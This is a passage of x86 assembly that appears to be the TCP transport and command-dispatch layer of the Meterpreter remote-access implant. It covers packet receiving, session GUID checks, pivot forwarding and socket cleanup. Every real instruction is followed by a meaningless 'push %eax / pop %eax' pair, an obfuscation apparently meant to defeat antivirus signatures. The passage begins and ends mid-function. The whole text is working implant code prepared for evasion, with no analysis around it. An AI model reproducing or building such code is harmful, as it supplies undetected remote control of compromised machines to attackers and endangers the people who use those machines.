	movl	-65704(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 96(%esp)
push %eax
pop %eax
	movl	-65708(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 92(%esp)
push %eax
pop %eax
	movl	-65712(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 88(%esp)
push %eax
pop %eax
	movl	-65716(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 84(%esp)
push %eax
pop %eax
	movl	-65720(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 80(%esp)
push %eax
pop %eax
	movl	-65724(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 76(%esp)
push %eax
pop %eax
	movl	-65728(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%esp)
push %eax
pop %eax
	movl	-65732(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 68(%esp)
push %eax
pop %eax
	movl	-65736(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-65740(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-65744(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-65748(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-65752(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-65756(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-65760(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-65764(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-65768(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-65772(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-65776(%ebp), %edi
push %eax
pop %eax
	movl	%edi, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC11, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-100(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ntohl@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	subl	$8, %eax
push %eax
pop %eax
	movl	%eax, -64(%ebp)
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC14, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	addl	$32, %eax
push %eax
pop %eax
	movl	%eax, -68(%ebp)
push %eax
pop %eax
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC15, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	cmpl	$0, -40(%ebp)
push %eax
pop %eax
	jne	L70
push %eax
pop %eax
	movl	$LC16, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$8, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L70:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC17, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$32, 12(%esp)
push %eax
pop %eax
	leal	-65660(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$32, 4(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__memcpy_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	$32, %eax
push %eax
pop %eax
	movl	%eax, -72(%ebp)
push %eax
pop %eax
	jmp	L72
push %eax
pop %eax
L76:
	movl	-32(%ebp), %edx
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	subl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	-72(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__recv@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -80(%ebp)
push %eax
pop %eax
	cmpl	$0, -80(%ebp)
push %eax
pop %eax
	jg	L73
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	cmpl	$10035, %eax
push %eax
pop %eax
	jne	L74
push %eax
pop %eax
	jmp	L72
push %eax
pop %eax
L74:
	cmpl	$0, -80(%ebp)
push %eax
pop %eax
	jns	L86
push %eax
pop %eax
	movl	$1168, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L86
push %eax
pop %eax
L73:
	movl	-80(%ebp), %eax
push %eax
pop %eax
	subl	%eax, -32(%ebp)
push %eax
pop %eax
L72:
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	jne	L76
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	je	L77
push %eax
pop %eax
	movl	$LC18, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L77:
	leal	-124(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65676(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65680(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65684(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65688(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65692(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -65696(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -65700(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -65704(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -65708(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -65712(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-65676(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-65680(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-65684(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-65688(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-65692(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-65696(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-65700(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-65704(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-65708(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-65712(%ebp), %esi
push %eax
pop %eax
	movl	%esi, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC19, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	leal	-124(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_is_null_guid
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L78
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	addl	$32, %eax
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	leal	-124(%ebp), %edx
push %eax
pop %eax
	addl	$4, %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memcmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L79
push %eax
pop %eax
L78:
	movl	$LC20, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_decrypt_packet
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L79:
	movl	$LC21, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	leal	-124(%ebp), %edx
push %eax
pop %eax
	addl	$4, %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_pivot_tree_find
push %eax
pop %eax
	movl	%eax, -76(%ebp)
push %eax
pop %eax
	cmpl	$0, -76(%ebp)
push %eax
pop %eax
	je	L81
push %eax
pop %eax
	movl	$LC22, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-68(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_pivot_packet_dispatch
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$0, -40(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$0, (%eax)
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L81:
	movl	$LC23, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L85:
	nop
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L86:
	nop
push %eax
pop %eax
L59:
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -92(%ebp)
push %eax
pop %eax
	movl	$LC24, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	cmpl	$0, -40(%ebp)
push %eax
pop %eax
	je	L82
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	$0, -40(%ebp)
push %eax
pop %eax
L82:
	cmpl	$0, -92(%ebp)
push %eax
pop %eax
	je	L83
push %eax
pop %eax
	cmpl	$0, -48(%ebp)
push %eax
pop %eax
	je	L83
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	$0, -48(%ebp)
push %eax
pop %eax
L83:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_release
push %eax
pop %eax
	movl	$LC25, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-92(%ebp), %eax
push %eax
pop %eax
	leal	-12(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%edi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC26:
	.ascii "[DISPATCH] entering server_dispatch( 0x%08X )\0"
	.align 4
LC27:
	.ascii "[DISPATCH] server dispatch thread signaled to terminate...\0"
	.align 4
LC28:
	.ascii "[DISPATCH] packet_receive returned %d, exiting dispatcher...\0"
	.align 4
LC29:
	.ascii "[DISPATCH] No packet received, probably just metsrv being ignored or a pivot packet being handled.\0"
LC30:
	.ascii "continue\0"
LC31:
	.ascii "stop\0"
	.align 4
LC32:
	.ascii "[DISPATCH] command_process result: %s\0"
LC33:
	.ascii "[DISPATCH] session has ended\0"
	.align 4
LC34:
	.ascii "[DISPATCH] communications has timed out\0"
	.align 4
LC35:
	.ascii "[DISPATCH] server_socket_poll returned %d, exiting dispatcher...\0"
	.align 4
LC36:
	.ascii "[DISPATCH] leaving server_dispatch.\0"
	.text
	.def	_server_dispatch_tcp;	.scl	3;	.type	32;	.endef
_server_dispatch_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	$1, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -36(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC26, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	jmp	L88
push %eax
pop %eax
L99:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_event_poll
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L89
push %eax
pop %eax
	movl	$LC27, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L90
push %eax
pop %eax
L89:
	movl	$50000, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_server_socket_poll
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jle	L91
push %eax
pop %eax
	leal	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_receive
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L92
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC28, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L90
push %eax
pop %eax
L92:
	movl	-36(%ebp), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L93
push %eax
pop %eax
	movl	$LC29, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L94
push %eax
pop %eax
L93:
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_command_handle
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L95
push %eax
pop %eax
	movl	$LC30, %eax
push %eax
pop %eax
	jmp	L96
push %eax
pop %eax
L95:
	movl	$LC31, %eax
push %eax
pop %eax
L96:
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC32, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L94:
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	jmp	L88
push %eax
pop %eax
L91:
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L97
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	72(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, -32(%ebp)
push %eax
pop %eax
	jle	L98
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$LC33, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L90
push %eax
pop %eax
L98:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	subl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	52(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, %edx
push %eax
pop %eax
	jle	L88
push %eax
pop %eax
	movl	$5035, -16(%ebp)
push %eax
pop %eax
	movl	$LC34, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L90
push %eax
pop %eax
L97:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC35, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L90
push %eax
pop %eax
L88:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	jne	L99
push %eax
pop %eax
L90:
	movl	$LC36, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_transport_get_handle_tcp;	.scl	3;	.type	32;	.endef
_transport_get_handle_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L102
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$1, %eax
push %eax
pop %eax
	jne	L102
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	jmp	L103
push %eax
pop %eax
L102:
	movl	$0, %eax
push %eax
pop %eax
L103:
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_transport_set_handle_tcp;	.scl	3;	.type	32;	.endef
_transport_set_handle_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L106
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$1, %eax
push %eax
pop %eax
	jne	L106
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
L106:
	nop
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC37:
	.ascii "[TRANS TCP] Destroying tcp transport for url %S\0"
	.text
	.def	_transport_destroy_tcp;	.scl	3;	.type	32;	.endef
_transport_destroy_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L111
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$1, %eax
push %eax
pop %eax
	jne	L111
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC37, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L109
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 44(%eax)
push %eax
pop %eax
L109:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L110
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 48(%eax)
push %eax
pop %eax
L110:
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L111
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	$0, 8(%ebp)
push %eax
pop %eax
L111:
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC38:
	.ascii "[TCP] waiting for disconnect from remote\0"
	.align 4
LC39:
	.ascii "[TCP] disconnect received, cleaning up\0"
	.text
	.globl	_cleanup_socket@4
	.def	_cleanup_socket@4;	.scl	2;	.type	32;	.endef
_cleanup_socket@4:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	$LC38, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L113
push %eax
pop %eax
L115:
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jle	L117
push %eax
pop %eax
L113:
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	leal	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__recv@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L115
push %eax
pop %eax
	jmp	L114
push %eax
pop %eax
L117:
	nop
push %eax
pop %eax
L114:
	movl	$LC39, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__closesocket@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_thread_destroy
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret	$4
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC40:
	.ascii "[TCP] Resetting transport from %u\0"
	.align 4
LC41:
	.ascii "[TCP] Transport is shutting down\0"
	.align 4
LC42:
	.ascii "[TCP] It should now be safe to close the socket.\0"
	.align 4
LC43:
	.ascii "[TCP] Transport 0x%p is now reset to %u\0"
	.text
	.def	_transport_reset_tcp;	.scl	3;	.type	32;	.endef
_transport_reset_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L122
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$1, %eax
push %eax
pop %eax
	jne	L122
push %eax
pop %eax
